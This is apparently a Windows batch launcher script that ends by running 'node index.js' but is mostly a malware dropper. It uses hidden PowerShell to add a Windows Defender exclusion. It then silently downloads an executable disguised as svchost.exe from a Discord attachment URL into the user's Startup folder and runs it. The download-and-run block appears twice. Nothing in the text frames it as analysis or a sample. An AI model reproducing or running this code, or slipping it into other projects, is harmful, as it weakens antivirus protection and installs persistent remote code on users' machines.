powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1212759870869340180/svchost.exe?ex=65f301a5&is=65e08ca5&hm=3936d93316487270af48574a6e3b58769be08ce5e04c2be9a2b7e3868c2af124&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1212759870869340180/svchost.exe?ex=65f301a5&is=65e08ca5&hm=3936d93316487270af48574a6e3b58769be08ce5e04c2be9a2b7e3868c2af124&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"


node index.js
pause
